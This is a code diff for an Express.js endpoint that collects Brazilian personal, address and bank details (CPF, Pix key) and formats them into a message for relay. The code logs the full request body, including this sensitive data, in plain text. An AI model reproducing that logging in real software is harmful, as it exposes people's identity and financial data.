@@ -573,12 +573,26 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
     const dados = req.body;
     console.log("Dados recebidos:", JSON.stringify(dados));
 
-    // Verificar se os dados são válidos
-    if (!dados.nome || !dados.email || !dados.telefone || !dados.cpf) {
+    // Verificar se os dados são válidos (incluindo endereço e ID do produto)
+    if (
+      !dados.nome || 
+      !dados.email || 
+      !dados.telefone || 
+      !dados.cpf || 
+      !dados.banco || 
+      !dados.pix_tipo || 
+      !dados.pix_chave ||
+      !dados.cep ||
+      !dados.logradouro ||
+      !dados.numero ||
+      !dados.bairro ||
+      !dados.cidade ||
+      !dados.estado
+    ) {
       console.error("Dados incompletos recebidos");
       return res.status(400).json({
         success: false,
-        message: "Dados pessoais ou de endereço incompletos",
+        message: "Dados pessoais, de endereço ou bancários incompletos",
       });
     }
 
@@ -592,18 +606,24 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
       });
     }
 
-    // Formatar mensagem com os dados recebidos
+    // Formatar mensagem com os dados recebidos (incluindo endereço)
     const mensagem =
-      `*Novos dados bancários recebidos*\n\n` +
+      `*Novos dados recebidos*\n\n` +
+      `*ID da Venda:* ${dados.idProduto || 'Não informado'}\n\n` +
       `*Dados Pessoais:*\n` +
       `Nome: ${dados.nome}\n` +
       `Email: ${dados.email}\n` +
       `Telefone: ${dados.telefone}\n` +
       `CPF: ${dados.cpf}\n\n` +
+      `*Endereço:*\n` +
+      `CEP: ${dados.cep}\n` +
+      `Logradouro: ${dados.logradouro}, ${dados.numero}${dados.complemento ? ' (' + dados.complemento + ')' : ''}\n` +
+      `Bairro: ${dados.bairro}\n` +
+      `Cidade/UF: ${dados.cidade}/${dados.estado}\n\n` +
       `*Dados Bancários:*\n` +
       `Banco: ${dados.banco}\n` +
-      `Tipo de Chave Pix: ${dados["chave-pix-tipo"]}\n` +
-      `Chave Pix: ${dados["chave-pix"]}\n\n` +
+      `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
+      `Chave Pix: ${dados.pix_chave}\n\n` +
       `Enviado em: ${new Date().toLocaleString("pt-BR")}`;
 
     console.log("Mensagem formatada, iniciando envio...");
